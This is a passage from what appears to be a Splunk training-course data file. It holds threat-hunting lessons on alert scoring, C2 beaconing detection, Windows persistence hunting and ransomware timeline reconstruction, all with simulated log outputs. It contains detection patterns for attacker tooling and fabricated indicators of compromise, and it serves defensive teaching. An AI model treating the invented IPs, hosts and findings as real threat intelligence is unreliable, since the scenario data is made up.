                        <li>Different user agents: Browser (legitimate) vs Python script (attacker)</li>
                        <li>Simultaneous active sessions</li>
                        <li>NYC session performing bulk API data extraction</li>
                    </ul><br>
                    <strong>Actions:</strong>
                    <ol>
                        <li>Revoke all active sessions for jsmith</li>
                        <li>Force password reset and MFA re-enrollment</li>
                        <li>Block IP 74.125.23.100</li>
                        <li>Review all API access from that IP</li>
                        <li>Check for data exfiltration (contacts export, document downloads)</li>
                        <li>Investigate how credentials were compromised (phishing, malware, reuse)</li>
                    </ol>`
            }
        },
        {
            id: 'int-009',
            title: 'Building Severity Scores',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '20 min',
            objectives: [
                'Use conditional logic to categorize events',
                'Build composite risk scores',
                'Prioritize alerts effectively'
            ],
            tags: ['eval', 'case', 'scoring', 'prioritization', 'alerting'],
            description: 'Learn to build severity and risk scores using conditional logic.',
            content: {
                problem: 'Your SOC receives too many alerts. Build a severity scoring system for firewall events that considers: bytes transferred (data exfiltration risk), destination reputation (threat intel), time of day (after-hours is suspicious), and connection frequency (scanning behavior). Output events with a composite score sorted by highest risk.',
                hints: [
                    'Use case() for multi-condition severity levels',
                    'Create individual scores for each factor, then combine them',
                    'eval can reference previously defined fields in the same command',
                    'Use strftime to check time of day'
                ],
                solution: {
                    spl: `index=firewall action=allowed
| lookup threat_intel.csv ip as dest_ip OUTPUT threat_score
| eval threat_score = coalesce(threat_score, 0)
| eval hour = strftime(_time, "%H")
| eval bytes_score = case(
    bytes_out > 100000000, 4,
    bytes_out > 10000000, 3,
    bytes_out > 1000000, 2,
    bytes_out > 100000, 1,
    true(), 0)
| eval time_score = if(hour >= 22 OR hour < 6, 2, 0)
| eval dest_score = case(
    threat_score >= 80, 4,
    threat_score >= 50, 3,
    threat_score >= 20, 2,
    threat_score > 0, 1,
    true(), 0)
| stats count as connections, sum(bytes_out) as total_bytes, max(bytes_score) as bytes_score, max(time_score) as time_score, max(dest_score) as dest_score by src_ip, dest_ip
| eval freq_score = case(connections > 1000, 3, connections > 100, 2, connections > 10, 1, true(), 0)
| eval total_score = bytes_score + time_score + dest_score + freq_score
| eval severity = case(total_score >= 8, "critical", total_score >= 5, "high", total_score >= 3, "medium", true(), "low")
| where severity IN ("critical", "high")
| sort -total_score
| table src_ip, dest_ip, severity, total_score, connections, total_bytes, bytes_score, time_score, dest_score, freq_score`,
                    explanation: 'We build individual scores for each risk factor (bytes, time, threat intel, frequency) on a consistent scale (0-4). Then combine them into a total score and map to severity levels. This creates a prioritized, explainable alert queue.'
                },
                variations: [
                    {
                        description: 'Add geographic risk (connections to high-risk countries):',
                        spl: `... | iplocation dest_ip
| eval geo_score = case(
    Country IN ("Russia", "China", "North Korea", "Iran"), 3,
    Country IN ("Ukraine", "Romania", "Brazil"), 2,
    isnull(Country), 1,
    true(), 0)
| eval total_score = bytes_score + time_score + dest_score + freq_score + geo_score`
                    },
                    {
                        description: 'Weight certain factors more heavily:',
                        spl: '... | eval total_score = (bytes_score * 2) + time_score + (dest_score * 3) + freq_score'
                    },
                    {
                        description: 'Add user context for insider threat scoring:',
                        spl: `... | lookup user_risk.csv user OUTPUT user_risk_score, department
| eval user_score = case(department="Finance" AND bytes_out > 10000000, 3, user_risk_score > 50, 2, true(), 0)`
                    },
                    {
                        description: 'Create severity with icons for dashboards:',
                        spl: '... | eval severity_icon = case(severity="critical", "🔴", severity="high", "🟠", severity="medium", "🟡", true(), "🟢")'
                    }
                ]
            }
        }
    ],

    advanced: [
        {
            id: 'adv-001',
            title: 'Statistical Baselines',
            type: 'tutorial',
            difficulty: 'advanced',
            duration: '30 min',
            objectives: [
                'Calculate dynamic baselines with eventstats',
                'Detect deviations with streamstats',
                'Build anomaly detection logic'
            ],
            tags: ['statistics', 'baselines', 'anomaly-detection'],
            description: 'Master eventstats and streamstats for sophisticated statistical analysis.',
            content: {
                sections: [
                    {
                        title: 'eventstats vs stats',
                        body: `<p><code>eventstats</code> is like stats, but it adds the aggregation to each event WITHOUT collapsing rows. This lets you compare each event to the group.</p>`,
                        spl: 'index=web | eventstats avg(response_time) as avg_response, stdev(response_time) as stdev_response by uri_path | eval z_score=(response_time - avg_response) / stdev_response | where z_score > 3',
                        explanation: 'Calculate average response time per URL, then find requests with z-score > 3 (statistical outliers).'
                    },
                    {
                        title: 'streamstats for Moving Windows',
                        body: `<p><code>streamstats</code> calculates statistics over a moving window of events. Great for detecting sudden changes.</p>`,
                        spl: 'index=web | bin _time span=5m | stats count by _time | streamstats window=12 avg(count) as rolling_avg, stdev(count) as rolling_stdev | eval upper_bound=rolling_avg+(2*rolling_stdev) | where count > upper_bound',
                        explanation: 'Calculate 1-hour rolling average (12 x 5min buckets), flag when current count exceeds 2 standard deviations.'
                    },
                    {
                        title: 'Building Baselines',
                        body: `<p>Create robust baselines using historical data:</p>`,
                        spl: 'index=auth action=failure | bin _time span=1h | stats count as failures by _time, user | eventstats avg(failures) as baseline_avg, stdev(failures) as baseline_stdev by user | eval anomaly_score=(failures - baseline_avg) / baseline_stdev | where anomaly_score > 2',
                        explanation: 'Per-user baseline for failed authentications. Flag hours with significantly elevated failures.'
                    },
                    {
                        title: 'Percentile-Based Detection',
                        body: `<p>Percentiles can be more robust than standard deviation for non-normal distributions:</p>`,
                        spl: 'index=firewall | stats sum(bytes_out) as bytes by src_ip | eventstats perc95(bytes) as p95_bytes, perc99(bytes) as p99_bytes | eval severity=case(bytes>p99_bytes, "critical", bytes>p95_bytes, "warning", 1=1, "normal") | where severity!="normal"',
                        explanation: 'Flag IPs above the 95th and 99th percentile of traffic volume.'
                    }
                ]
            }
        },
        {
            id: 'adv-002',
            title: 'Beaconing Detection',
            type: 'scenario',
            difficulty: 'advanced',
            duration: '35 min',
            objectives: [
                'Identify periodic C2 communication patterns',
                'Calculate timing consistency metrics',
                'Distinguish beacons from legitimate traffic'
            ],
            tags: ['network', 'threat-hunting', 'malware', 'c2'],
            description: 'Hunt for command-and-control beacons hidden in network traffic.',
            content: {
                situation: `Threat intelligence suggests attackers are using HTTPS beacons with 5-minute intervals to exfiltrate data. These beacons blend in with normal traffic but have telltale timing patterns. Hunt for them.`,
                steps: [
                    {
                        question: 'First, find all external HTTPS connections and calculate how many times each src_ip/dest_ip pair communicated.',
                        hint: 'Filter to HTTPS (port 443) to external IPs and count connections per pair.',
                        spl: 'index=firewall dest_port=443 NOT dest_ip="10.*" NOT dest_ip="192.168.*" NOT dest_ip="172.16.*" | stats count by src_ip, dest_ip | where count > 20 | sort -count',
                        analysis: 'Find frequently communicating pairs.',
                        output: {
                            columns: ['src_ip', 'dest_ip', 'count'],
                            rows: [
                                { 'src_ip': '10.10.25.44', 'dest_ip': '185.220.101.54', 'count': '288' },
                                { 'src_ip': '10.10.33.78', 'dest_ip': '91.219.237.99', 'count': '144' },
                                { 'src_ip': '10.10.42.19', 'dest_ip': '45.33.32.156', 'count': '96' },
                                { 'src_ip': '10.10.15.22', 'dest_ip': '142.250.185.46', 'count': '87' },
                                { 'src_ip': '10.10.18.55', 'dest_ip': '13.107.42.14', 'count': '72' }
                            ],
                            truncated: 'Showing 5 of 847 IP pairs'
                        },
                        finding: 'Found 847 IP pairs with 20+ connections today. Need to narrow down to those with beacon-like regularity.'
                    },
                    {
                        question: 'Beacons have consistent timing. Calculate the time delta between consecutive connections for each pair.',
                        hint: 'Use streamstats to calculate time between events, then look at consistency.',
                        spl: 'index=firewall dest_port=443 src_ip="10.10.25.44" dest_ip="185.220.101.54" | sort _time | streamstats window=2 current=t earliest(_time) as prev_time by src_ip, dest_ip | eval delta=_time-prev_time | where isnotnull(delta) | stats avg(delta) as avg_delta, stdev(delta) as stdev_delta, count | eval consistency=stdev_delta/avg_delta',
                        analysis: 'Low consistency ratio (stdev/avg) means regular timing - beacon behavior.',
                        output: {
                            columns: ['avg_delta', 'stdev_delta', 'count', 'consistency'],
                            rows: [
                                { 'avg_delta': '300.12', 'stdev_delta': '15.03', 'count': '287', 'consistency': '0.050' }
                            ]
                        },
                        finding: 'This pair shows avg_delta=300 seconds (5 minutes) with stdev=15 (consistency=0.05). Extremely regular - strong beacon indicator!'
                    },
                    {
                        question: 'Now automate this across all pairs. Find those with beacon-like timing patterns.',
                        hint: 'Apply the timing analysis to all pairs with sufficient data points.',
                        spl: 'index=firewall dest_port=443 NOT dest_ip="10.*" NOT dest_ip="192.168.*" | sort _time | streamstats window=2 current=t earliest(_time) as prev_time by src_ip, dest_ip | eval delta=_time-prev_time | where isnotnull(delta) AND delta > 60 AND delta < 3600 | stats avg(delta) as avg_delta, stdev(delta) as stdev_delta, count by src_ip, dest_ip | where count > 10 | eval consistency=round(stdev_delta/avg_delta, 3) | where consistency < 0.15 | sort consistency | head 20',
                        analysis: 'Find pairs with high count, 1-60 minute intervals, and consistency < 0.15.',
                        output: {
                            columns: ['src_ip', 'dest_ip', 'avg_delta', 'stdev_delta', 'count', 'consistency'],
                            rows: [
                                { 'src_ip': '10.10.25.44', 'dest_ip': '185.220.101.54', 'avg_delta': '300.12', 'stdev_delta': '15.03', 'count': '287', 'consistency': '0.050' },
                                { 'src_ip': '10.10.33.78', 'dest_ip': '91.219.237.99', 'avg_delta': '600.45', 'stdev_delta': '48.04', 'count': '143', 'consistency': '0.080' },
                                { 'src_ip': '10.10.42.19', 'dest_ip': '45.33.32.156', 'avg_delta': '900.22', 'stdev_delta': '99.02', 'count': '95', 'consistency': '0.110' }
                            ],
                            truncated: 'Showing top 3 beacon candidates'
                        },
                        finding: 'Top 3 beacon candidates:\n1. 10.10.25.44 → 185.220.101.54: 5-min interval, consistency=0.05\n2. 10.10.33.78 → 91.219.237.99: 10-min interval, consistency=0.08\n3. 10.10.42.19 → 45.33.32.156: 15-min interval, consistency=0.11'
                    },
                    {
                        question: 'Check if these destinations are known malicious or have suspicious characteristics.',
                        hint: 'Cross-reference with threat intel and check reverse DNS.',
                        spl: 'index=firewall dest_ip IN ("185.220.101.54", "91.219.237.99", "45.33.32.156") | iplocation dest_ip | lookup threat_intel_ip ip as dest_ip OUTPUT threat_type, malware_family | stats count, values(src_ip) as infected_hosts by dest_ip, dest_country, threat_type, malware_family',
                        analysis: 'Enrich beacon destinations with context.',
                        output: {
                            columns: ['dest_ip', 'dest_country', 'threat_type', 'malware_family', 'count', 'infected_hosts'],
                            rows: [
                                { 'dest_ip': '185.220.101.54', 'dest_country': 'Netherlands', 'threat_type': 'C2', 'malware_family': 'Cobalt Strike', 'count': '288', 'infected_hosts': '10.10.25.44' },
                                { 'dest_ip': '91.219.237.99', 'dest_country': 'Germany', 'threat_type': 'TOR Exit', 'malware_family': '-', 'count': '144', 'infected_hosts': '10.10.33.78' },
                                { 'dest_ip': '45.33.32.156', 'dest_country': 'United States', 'threat_type': '-', 'malware_family': '-', 'count': '96', 'infected_hosts': '10.10.42.19' }
                            ]
                        },
                        finding: 'CONFIRMED: 185.220.101.54 matches known Cobalt Strike C2 infrastructure in threat intel. 91.219.237.99 is TOR exit node. 45.33.32.156 is clean (legitimate SaaS - false positive).'
                    },
                    {
                        question: 'For confirmed C2, what data might be exfiltrated? Check bytes transferred.',
                        hint: 'Look at data volume over time for the malicious connection.',
                        spl: 'index=firewall dest_ip="185.220.101.54" | timechart span=1h sum(bytes_in) as bytes_in, sum(bytes_out) as bytes_out | eval in_MB=round(bytes_in/1024/1024,2), out_MB=round(bytes_out/1024/1024,2)',
                        analysis: 'Analyze data transfer patterns to/from C2.',
                        output: {
                            columns: ['_time', 'bytes_in', 'bytes_out', 'in_MB', 'out_MB'],
                            rows: [
                                { '_time': '2024-01-15 00:00', 'bytes_in': '52428', 'bytes_out': '5242', 'in_MB': '0.05', 'out_MB': '0.01' },
                                { '_time': '2024-01-15 01:00', 'bytes_in': '48576', 'bytes_out': '4857', 'in_MB': '0.05', 'out_MB': '0.00' },
                                { '_time': '2024-01-15 02:00', 'bytes_in': '51200', 'bytes_out': '5120', 'in_MB': '0.05', 'out_MB': '0.00' },
                                { '_time': '2024-01-15 03:00', 'bytes_in': '102400', 'bytes_out': '47185920', 'in_MB': '0.10', 'out_MB': '45.00' },
                                { '_time': '2024-01-15 04:00', 'bytes_in': '49152', 'bytes_out': '4915', 'in_MB': '0.05', 'out_MB': '0.00' }
                            ],
                            truncated: 'Showing 5 of 24 hours'
                        },
                        finding: 'Pattern shows small outbound (commands ~5KB) but larger inbound (responses ~50KB). Also one spike of 45MB outbound at 3 AM - possible data exfiltration event!'
                    }
                ],
                conclusion: `<strong>C2 Beaconing Confirmed!</strong><br><br>
                    <strong>Confirmed C2 Infrastructure:</strong>
                    <ul>
                        <li>185.220.101.54 - Cobalt Strike C2 (5-min beacon)</li>
                        <li>91.219.237.99 - TOR exit node (10-min beacon)</li>
                    </ul><br>
                    <strong>Infected Host:</strong> 10.10.25.44 (primary), 10.10.33.78 (secondary)<br><br>
                    <strong>Data Exfiltration:</strong> 45MB transferred to C2 at 3 AM<br><br>
                    <strong>Recommended Actions:</strong>
                    <ol>
                        <li>Isolate 10.10.25.44 and 10.10.33.78 immediately</li>
                        <li>Block C2 IPs at perimeter firewall</li>
                        <li>Forensic imaging of affected systems</li>
                        <li>Hunt for lateral movement from these hosts</li>
                        <li>Implement automated beaconing detection</li>
                    </ol>`
            }
        },
        {
            id: 'adv-003',
            title: 'Persistence Mechanism Detection',
            type: 'scenario',
            difficulty: 'advanced',
            duration: '30 min',
            objectives: [
                'Identify registry-based persistence',
                'Detect scheduled task abuse',
                'Recognize service installation patterns'
            ],
            tags: ['endpoint', 'persistence', 'threat-hunting', 'windows'],
            description: 'Hunt for attacker persistence mechanisms in Windows endpoint logs.',
            content: {
                situation: `After discovering a compromised system, you need to determine if the attacker established persistence. Check for common Windows persistence mechanisms: Run keys, scheduled tasks, and services.`,
                steps: [
                    {
                        question: 'Start with registry-based persistence. Look for modifications to common Run keys.',
                        hint: 'Registry events with paths containing "Run" or "RunOnce" are persistence indicators.',
                        spl: 'index=sysmon EventCode=13 | where match(TargetObject, "(?i)(Run|RunOnce)") | stats count, values(Details) as commands by TargetObject, Image, user | sort -count',
                        analysis: 'Sysmon EventCode 13 is registry value set. We filter to Run keys.',
                        output: {
                            columns: ['TargetObject', 'Image', 'user', 'commands', 'count'],
                            rows: [
                                { 'TargetObject': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater', 'Image': 'C:\\Windows\\System32\\reg.exe', 'user': 'admin_jmorgan', 'commands': 'C:\\Users\\Public\\updater.exe', 'count': '1' },
                                { 'TargetObject': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth', 'Image': 'C:\\Windows\\System32\\reg.exe', 'user': 'SYSTEM', 'commands': 'C:\\Program Files\\Windows Defender\\MSASCuiL.exe', 'count': '1' }
                            ]
                        },
                        finding: 'Suspicious entry found: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater" pointing to "C:\\Users\\Public\\updater.exe". This is NOT a Microsoft binary.'
                    },
                    {
                        question: 'Check scheduled tasks for suspicious entries. Look for newly created tasks.',
                        hint: 'Event 4698 is scheduled task creation. Look for unusual task paths or executables.',
                        spl: 'index=wineventlog EventCode=4698 | rex field=TaskContent "<Command>(?<command>[^<]+)</Command>" | rex field=TaskContent "<Arguments>(?<arguments>[^<]*)</Arguments>" | rex field=TaskContent "<UserId>(?<run_as>[^<]+)</UserId>" | stats count by TaskName, command, arguments, run_as, SubjectUserName | sort -count',
                        analysis: 'Parse scheduled task creation events to see what\'s being scheduled.',
                        output: {
                            columns: ['TaskName', 'command', 'arguments', 'run_as', 'SubjectUserName', 'count'],
                            rows: [
                                { 'TaskName': 'GoogleUpdate', 'command': 'C:\\Windows\\Temp\\update.exe', 'arguments': '-silent', 'run_as': 'SYSTEM', 'SubjectUserName': 'admin_jmorgan', 'count': '1' },
                                { 'TaskName': 'MicrosoftEdgeUpdateTaskMachine', 'command': 'C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe', 'arguments': '/c', 'run_as': 'SYSTEM', 'SubjectUserName': 'SYSTEM', 'count': '1' }
                            ]
                        },
                        finding: 'Suspicious task "GoogleUpdate" running C:\\Windows\\Temp\\update.exe as SYSTEM. Created by admin_jmorgan. Google doesn\'t put updates in TEMP!'
                    },
                    {
                        question: 'Check for new service installations that could be backdoors.',
                        hint: 'Event 4697 or 7045 indicates new service installation.',
                        spl: 'index=wineventlog EventCode IN (4697, 7045) | rex field=ServiceFileName "(?<service_path>[^\"]+)" | stats count by ServiceName, ServiceType, service_path, SubjectUserName | where NOT match(service_path, "(?i)(System32|SysWOW64|Program Files)")',
                        analysis: 'New services running from unusual paths are suspicious.',
                        output: {
                            columns: ['ServiceName', 'ServiceType', 'service_path', 'SubjectUserName', 'count'],
                            rows: [
                                { 'ServiceName': 'WindowsHelper', 'ServiceType': 'user mode service', 'service_path': 'C:\\ProgramData\\helper.exe', 'SubjectUserName': 'admin_jmorgan', 'count': '1' }
                            ]
                        },
                        finding: 'Service "WindowsHelper" installed from "C:\\ProgramData\\helper.exe" - services should NOT run from ProgramData!'
                    },
                    {
                        question: 'Correlate these persistence mechanisms. Were they all created around the same time?',
                        hint: 'Look at timestamps across all three persistence types.',
                        spl: '(index=sysmon EventCode=13 TargetObject="*Run*WindowsUpdater*") OR (index=wineventlog EventCode=4698 TaskName="GoogleUpdate") OR (index=wineventlog EventCode=7045 ServiceName="WindowsHelper") | eval persistence_type=case(EventCode=13, "Registry", EventCode=4698, "ScheduledTask", EventCode=7045, "Service") | table _time, persistence_type, host, SubjectUserName | sort _time',
                        analysis: 'Timeline the persistence installations.',
                        output: {
                            columns: ['_time', 'persistence_type', 'host', 'SubjectUserName'],
                            rows: [
                                { '_time': '2024-01-15 02:41:17', 'persistence_type': 'Registry', 'host': 'WKS-HR-022', 'SubjectUserName': 'admin_jmorgan' },
                                { '_time': '2024-01-15 02:43:08', 'persistence_type': 'ScheduledTask', 'host': 'WKS-HR-022', 'SubjectUserName': 'admin_jmorgan' },
                                { '_time': '2024-01-15 02:45:22', 'persistence_type': 'Service', 'host': 'WKS-HR-022', 'SubjectUserName': 'admin_jmorgan' }
                            ]
                        },
                        finding: 'All three created within 4 minutes of each other (2:41-2:45 AM) by admin_jmorgan. This is a coordinated persistence installation!'
                    },
                    {
                        question: 'Verify these executables are malicious. Check if they\'re calling back to C2.',
                        hint: 'Look for network connections from these suspicious paths.',
                        spl: 'index=sysmon EventCode=3 | where match(Image, "(?i)(updater|update|helper)\\.exe") | stats count, values(DestinationIp) as dest_ips, values(DestinationPort) as dest_ports by Image | where count > 0',
                        analysis: 'Check network activity from suspected malicious binaries.',
                        output: {
                            columns: ['Image', 'dest_ips', 'dest_ports', 'count'],
                            rows: [
                                { 'Image': 'C:\\Users\\Public\\updater.exe', 'dest_ips': '185.220.101.54', 'dest_ports': '443', 'count': '47' },
                                { 'Image': 'C:\\Windows\\Temp\\update.exe', 'dest_ips': '185.220.101.54', 'dest_ports': '443', 'count': '23' },
                                { 'Image': 'C:\\ProgramData\\helper.exe', 'dest_ips': '185.220.101.54', 'dest_ports': '443', 'count': '31' }
                            ]
                        },
                        finding: 'Confirmed: All three executables connecting to 185.220.101.54:443 - same C2 identified in beaconing detection!'
                    }
                ],
                conclusion: `<strong>Multiple Persistence Mechanisms Identified!</strong><br><br>
                    <strong>Registry:</strong> HKLM\\..\\Run\\WindowsUpdater → C:\\Users\\Public\\updater.exe<br>
                    <strong>Scheduled Task:</strong> GoogleUpdate → C:\\Windows\\Temp\\update.exe (as SYSTEM)<br>
                    <strong>Service:</strong> WindowsHelper → C:\\ProgramData\\helper.exe<br><br>
                    <strong>Timeline:</strong> All installed 2:41-2:45 AM by admin_jmorgan (compromised account)<br><br>
                    <strong>C2:</strong> All executables beacon to 185.220.101.54<br><br>
                    <strong>Remediation:</strong>
                    <ol>
                        <li>Delete registry key, scheduled task, and service</li>
                        <li>Remove malicious executables from all paths</li>
                        <li>Verify no other persistence mechanisms exist</li>
                        <li>Check other systems for same IOCs</li>
                        <li>Full AV scan and reimage if needed</li>
                    </ol>`
            }
        },
        {
            id: 'adv-004',
            title: 'Anomaly Scoring',
            type: 'challenge',
            difficulty: 'advanced',
            duration: '20 min',
            objectives: [
                'Build composite anomaly scores',
                'Weight multiple indicators',
                'Prioritize investigation targets'
            ],
            tags: ['anomaly-detection', 'statistics', 'threat-hunting'],
            description: 'Create a weighted anomaly scoring system to prioritize threats.',
            content: {
                problem: 'Build an anomaly score for each user based on: (1) failed login ratio, (2) off-hours activity, (3) number of unique systems accessed. Weight factors: failed logins x3, off-hours x2, unique systems x1. Output a normalized 0-100 risk score.',
                hints: [
                    'Calculate each metric separately, then combine',
                    'Normalize each metric to 0-1 range before weighting',
                    'Use eventstats to get population-wide baselines for normalization'
                ],
                solution: {
                    spl: `index=wineventlog EventCode IN (4624, 4625)
| eval hour=strftime(_time, "%H")
| eval off_hours=if(hour<6 OR hour>20, 1, 0)
| stats count(eval(EventCode=4625)) as failures, count(eval(EventCode=4624)) as successes, sum(off_hours) as off_hour_events, dc(host) as unique_hosts by TargetUserName
| eval failure_ratio=failures/(failures+successes)
| eval off_hours_ratio=off_hour_events/(failures+successes)
| eventstats perc99(failure_ratio) as max_fail, perc99(off_hours_ratio) as max_offhours, perc99(unique_hosts) as max_hosts
| eval norm_fail=if(failure_ratio>max_fail, 1, failure_ratio/max_fail)
| eval norm_offhours=if(off_hours_ratio>max_offhours, 1, off_hours_ratio/max_offhours)
| eval norm_hosts=if(unique_hosts>max_hosts, 1, unique_hosts/max_hosts)
| eval risk_score=round(((norm_fail*3) + (norm_offhours*2) + (norm_hosts*1)) / 6 * 100, 0)
| where failures+successes > 10
| sort -risk_score
| table TargetUserName, risk_score, failures, successes, failure_ratio, off_hour_events, unique_hosts`,
                    explanation: 'We calculate three metrics per user, normalize each to 0-1 using percentile capping, apply weights (3, 2, 1), sum and normalize to 0-100. Users with highest composite scores should be investigated first.'
                },
                variations: [
                    {
                        description: 'Add data volume anomaly as a fourth factor (weight x2):',
                        spl: '... | join TargetUserName [search index=proxy | stats sum(bytes_out) as bytes by user | rename user as TargetUserName] | ... add bytes normalization and scoring ...'
                    },
                    {
                        description: 'Create IP-based risk scoring for firewall traffic:',
                        spl: 'index=firewall | stats dc(dest_ip) as unique_dests, dc(dest_port) as unique_ports, sum(bytes_out) as bytes by src_ip | ... normalize and score ...'
                    }
                ]
            }
        }
    ],

    expert: [
        {
            id: 'exp-001',
            title: 'Full Incident Timeline Reconstruction',
            type: 'scenario',
            difficulty: 'expert',
            duration: '45 min',
            objectives: [
                'Correlate events across multiple data sources',
                'Build complete attack timeline',
                'Determine full scope of compromise'
            ],
            tags: ['incident-response', 'timeline', 'correlation'],
            description: 'Reconstruct a complete attack timeline from initial access to impact.',
            content: {
                situation: `Critical alert: Ransomware encryption detected on FILESRV-02 at 4:32 AM. You need to reconstruct the complete attack timeline: initial access, lateral movement, privilege escalation, and impact. Multiple data sources are available: Windows event logs, Sysmon, firewall, proxy, and EDR.`,
                steps: [
                    {
                        question: 'Start at the end and work backwards. What process executed the ransomware on FILESRV-02?',
                        hint: 'Look for file creation or process execution events around 4:32 AM.',
                        spl: 'index=sysmon host="FILESRV-02" EventCode IN (1, 11) earliest="01/15/2024:04:25:00" latest="01/15/2024:04:35:00" | eval event_type=case(EventCode=1, "ProcessCreate", EventCode=11, "FileCreate") | table _time, event_type, Image, ParentImage, TargetFilename, User | sort _time',
                        analysis: 'Look for the ransomware execution event.',
                        output: {
                            columns: ['_time', 'event_type', 'Image', 'ParentImage', 'TargetFilename', 'User'],
                            rows: [
                                { '_time': '2024-01-15 04:31:42', 'event_type': 'ProcessCreate', 'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'ParentImage': 'C:\\Windows\\System32\\services.exe', 'TargetFilename': '-', 'User': 'SYSTEM' },
                                { '_time': '2024-01-15 04:31:45', 'event_type': 'ProcessCreate', 'Image': 'C:\\Windows\\Temp\\locker.exe', 'ParentImage': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'TargetFilename': '-', 'User': 'SYSTEM' },
                                { '_time': '2024-01-15 04:31:47', 'event_type': 'FileCreate', 'Image': 'C:\\Windows\\Temp\\locker.exe', 'ParentImage': '-', 'TargetFilename': 'D:\\Shares\\Finance\\README_ENCRYPTED.txt', 'User': 'SYSTEM' }
                            ],
                            truncated: 'Showing 3 of 847 events'
                        },
                        finding: 'Ransomware "locker.exe" launched at 4:31:45 from C:\\Windows\\Temp\\. Parent process: powershell.exe running as SYSTEM. PowerShell was spawned by services.exe - indicates scheduled task or service abuse.'
                    },
                    {
                        question: 'How did locker.exe get onto the file server? Check for lateral movement or file drops.',
                        hint: 'Look for file creation of locker.exe and network connections to the server.',
                        spl: 'index=sysmon host="FILESRV-02" EventCode=11 TargetFilename="*locker.exe" | append [search index=sysmon host="FILESRV-02" EventCode=3 DestinationPort IN (445, 139, 5985)] | sort _time | table _time, EventCode, Image, TargetFilename, SourceIp, DestinationPort, User',
                        analysis: 'Track how the ransomware binary arrived.',
                        output: {
                            columns: ['_time', 'EventCode', 'Image', 'TargetFilename', 'SourceIp', 'DestinationPort', 'User'],
                            rows: [
                                { '_time': '2024-01-15 04:14:22', 'EventCode': '3', 'Image': 'System', 'TargetFilename': '-', 'SourceIp': '10.10.25.44', 'DestinationPort': '5985', 'User': 'SYSTEM' },
                                { '_time': '2024-01-15 04:14:25', 'EventCode': '3', 'Image': 'C:\\Windows\\System32\\wsmprovhost.exe', 'TargetFilename': '-', 'SourceIp': '10.10.25.44', 'DestinationPort': '5985', 'User': 'admin_rthompson' },
                                { '_time': '2024-01-15 04:15:03', 'EventCode': '11', 'Image': 'C:\\Windows\\System32\\wbem\\wmiprvse.exe', 'TargetFilename': 'C:\\Windows\\Temp\\locker.exe', 'SourceIp': '-', 'DestinationPort': '-', 'User': 'SYSTEM' }
                            ]
                        },
                        finding: 'locker.exe created at 4:15 AM by wmiprvse.exe (WMI). Inbound WMI connection (port 5985) from 10.10.25.44 at 4:14. That\'s the source of lateral movement!'
                    },
                    {
                        question: 'What happened on 10.10.25.44 before it attacked the file server? This is likely patient zero.',
                        hint: 'Look for suspicious activity on the attacking workstation.',
                        spl: 'index=sysmon host="10.10.25.44" earliest="01/15/2024:00:00:00" latest="01/15/2024:04:30:00" EventCode IN (1, 3, 11) | where NOT match(Image, "(?i)(svchost|csrss|lsass|explorer|chrome|edge)") | stats count by Image, ParentImage | sort -count | head 20',
                        analysis: 'Profile unusual process activity on patient zero.',
                        output: {
                            columns: ['Image', 'ParentImage', 'count'],
                            rows: [
                                { 'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'ParentImage': 'C:\\Windows\\System32\\cmd.exe', 'count': '47' },
                                { 'Image': 'C:\\Users\\rthompson\\AppData\\Local\\Temp\\mimikatz.exe', 'ParentImage': 'C:\\Windows\\System32\\cmd.exe', 'count': '12' },
                                { 'Image': 'C:\\Windows\\System32\\wbem\\wmic.exe', 'ParentImage': 'C:\\Windows\\System32\\cmd.exe', 'count': '8' },
                                { 'Image': 'C:\\Windows\\System32\\cmd.exe', 'ParentImage': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'count': '6' }
                            ],
                            truncated: 'Showing 4 of 20 results'
                        },
                        finding: 'Suspicious activity: mimikatz.exe, powershell encoded commands, wmic.exe remote execution. Classic attack toolkit. Earliest malicious activity: 1:47 AM.'
                    },
                    {
                        question: 'How was 10.10.25.44 initially compromised? Check for phishing or external access.',
                        hint: 'Look at email, web browsing, or VPN access for the user of that workstation.',
                        spl: 'index=proxy src_ip="10.10.25.44" earliest="01/14/2024:08:00:00" latest="01/15/2024:02:00:00" | where match(url, "(?i)(\\.exe|\\.dll|\\.zip|\\.js|\\.hta)") OR category="malware" | table _time, url, content_type, bytes, category, user',
                        analysis: 'Look for initial payload download.',
                        output: {
                            columns: ['_time', 'url', 'content_type', 'bytes', 'category', 'user'],
                            rows: [
                                { '_time': '2024-01-14 23:47:15', 'url': 'hxxps://malicious-site[.]com/docs/invoice_12847.zip', 'content_type': 'application/zip', 'bytes': '245760', 'category': 'uncategorized', 'user': 'rthompson' },
                                { '_time': '2024-01-14 23:52:08', 'url': 'hxxps://cdn-payload[.]com/update.dll', 'content_type': 'application/octet-stream', 'bytes': '524288', 'category': 'malware', 'user': 'rthompson' }
                            ]
                        },
                        finding: 'At 11:47 PM on Jan 14, user rthompson downloaded "invoice_12847.zip" from hxxps://malicious-site[.]com. EDR logs show the ZIP contained a macro-enabled document.'
                    },
                    {
                        question: 'Map all systems the attacker touched. What\'s the full scope?',
                        hint: 'Track all lateral movement from patient zero using authentication and network logs.',
                        spl: 'index=wineventlog EventCode=4624 LogonType=3 IpAddress="10.10.25.44" earliest="01/15/2024:00:00:00" | append [search index=sysmon EventCode=3 SourceIp="10.10.25.44" earliest="01/15/2024:00:00:00" | where match(DestinationPort, "(445|139|5985|5986|3389)")] | stats earliest(_time) as first_access, latest(_time) as last_access, dc(DestinationPort) as ports by ComputerName, TargetUserName | sort first_access',
                        analysis: 'Full lateral movement map.',
                        output: {
                            columns: ['ComputerName', 'TargetUserName', 'first_access', 'last_access', 'ports'],
                            rows: [
                                { 'ComputerName': 'WKS-FIN-04', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 02:15:22', 'last_access': '2024-01-15 02:18:45', 'ports': '2' },
                                { 'ComputerName': 'WKS-HR-22', 'TargetUserName': 'admin_rthompson', 'first_access': '2024-01-15 02:22:08', 'last_access': '2024-01-15 02:25:33', 'ports': '1' },
